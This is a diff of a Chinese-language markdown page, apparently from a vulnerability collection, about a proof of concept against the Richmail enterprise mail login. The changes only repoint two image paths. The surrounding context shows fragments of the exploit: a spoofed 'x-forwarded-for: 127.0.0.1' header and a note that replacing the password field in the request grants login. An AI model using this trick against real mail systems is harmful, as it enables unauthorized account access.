@@ -18,7 +18,7 @@ Richmail 企业邮箱
 
 登陆页面
 
-![image-20231115104548787](images/image-20231115104548787.png)
+![image-20231115104548787](../.gitbook/assets/image-20231115104548787.png)
 
 poc
 
@@ -30,6 +30,6 @@ Content-Type: Application/X-www-Form
 x-forwarded-for: 127.0.0.1
 ```
 
-![image-20231115104603790](images/image-20231115104603790.png)
+![image-20231115104603790](../.gitbook/assets/image-20231115104603790.png)
 
 替换请求中的password字段即可登陆。
